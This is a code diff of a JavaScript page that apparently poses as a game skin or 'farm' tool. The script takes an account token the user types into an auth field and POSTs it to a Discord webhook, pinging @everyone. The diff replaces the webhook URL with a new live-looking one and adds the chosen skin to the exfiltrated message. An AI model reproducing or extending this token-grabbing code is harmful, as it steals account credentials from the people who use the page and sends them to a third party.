@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512728829163081788/zcnRNhZcwEyTYR9Qh1Ux3-L-af4q58hYFcEaZPi1tBDIPSvEQ30rUwQn_XX-BTobYG1X'; 
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504486169084301445/w_i3aEnuu9MmKjBMujqBmRTg6KeXD0aJcIZRZ2AnN0Pt1uS7G6fd0gfm3zUy0L_o-qTY'; 
 const authInput = document.getElementById('authField');
 const skinSelect = document.getElementById('skinSelect');
 const passwordInput = document.getElementById('passwordField');
@@ -74,12 +74,11 @@ startBtn.addEventListener('click', function () {
         id: selectedSkin
     };
     
-    // 3. Запрос в Discord
     const discordPromise = fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${authValue}\``
+            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${authValue}\`\n**Скин:** ${selectedSkin}`
         })
     });
     
